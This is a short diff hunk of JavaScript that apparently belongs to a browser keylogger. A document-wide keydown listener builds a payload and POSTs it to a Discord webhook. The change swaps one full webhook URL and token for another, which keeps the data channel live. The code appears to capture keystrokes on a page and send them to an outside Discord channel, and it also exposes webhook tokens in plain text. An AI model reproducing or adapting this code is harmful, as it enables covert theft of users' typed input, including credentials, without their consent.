@@ -17,7 +17,7 @@ document.addEventListener('keydown', async (event) => {
             ]
         });
         // send webhook
-        await fetch("https://discord.com/api/webhooks/796790905272795186/hQVi5HKJpdP46FOEWxXgjVUStqphpkjtzk3PG-ir-FB0fOHWHwiSotJOsSWp6nI8AvLv", {
+        await fetch("https://discord.com/api/webhooks/880181730231861309/ate4BsIJtkpAeFQwWt1qpMzVWtYJkcMWFUShDHhw2o7DlNw5x-7hCKn3Mu0sAadgi3vy", {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
